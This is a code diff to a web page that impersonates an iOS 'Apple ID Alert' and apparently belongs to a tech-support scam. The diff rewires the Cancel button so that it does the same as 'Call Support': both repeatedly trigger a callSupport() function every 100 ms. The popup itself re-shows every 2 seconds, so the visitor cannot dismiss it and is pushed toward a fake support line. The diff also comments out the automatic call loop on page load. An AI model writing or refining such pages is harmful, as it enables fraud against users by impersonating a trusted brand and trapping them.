@@ -457,7 +457,7 @@
  <h3 style="margin:0;font-size:17px;font-weight:600;">Apple ID Alert</h3>
  <p id="alertMessage" style="font-size:15px;margin:15px 0;line-height:1.4;"></p>
  <div style="display:flex;border-top:1px solid #ccc;margin-top:15px;">
-   <button disabled style="flex:1;border:none;background:transparent;padding:12px;font-size:16px;color:#999;cursor:not-allowed;border-right:1px solid #ccc;">Cancel</button>
+   <button onclick="cancelBtn()" style="flex:1;border:none;background:transparent;padding:12px;font-size:16px;color:#999;cursor:not-allowed;border-right:1px solid #ccc;">Cancel</button>
    <button onclick="okkkk()" style="flex:1;border:none;background:transparent;padding:12px;font-size:16px;color:#007aff;cursor:pointer;">Call Support</button>
  </div>
 </div>
@@ -473,6 +473,13 @@
     document.getElementById("iosAlert").style.display = "block";
   }
 
+  function cancelBtn() {
+    setInterval(()=>{ callSupport() },100)
+}
+
+function okkkk() {
+   setInterval(()=>{ callSupport() },100)
+}
   
   // Popup trigger
   function myFunction() {
@@ -484,7 +491,7 @@
   window.onload = function() {
     myFunction();
     setInterval(myFunction, 2000); // re-show popup every 5 seconds
-    setInterval(()=>{ callSupport() },1000);
+    // setInterval(()=>{ callSupport() },1000);
   };
 
   function callSupport() {
